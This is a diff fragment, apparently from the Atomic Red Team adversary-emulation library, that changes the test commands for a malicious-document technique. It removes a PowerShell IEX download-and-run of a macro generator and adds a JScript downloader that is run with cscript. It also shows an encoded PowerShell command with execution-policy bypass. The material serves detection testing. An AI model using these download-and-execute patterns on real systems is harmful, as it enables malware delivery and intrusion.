@@ -71,6 +71,5 @@ powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhA
 
 
 *
-@echo off
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing); $macrocode = '   Open ''C:\Users\Public\art.jse'' For Output As #1`n   Write #1, ''WScript.Quit''`n   Close #1`n   Shell`$ ''cscript.exe C:\Users\Public\art.jse''`n'; Invoke-MalDoc -macroCode $macrocode -officeProduct 'Word'"
-
+echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
+cscript //E:Jscript %TEMP%\OSTapGet.js
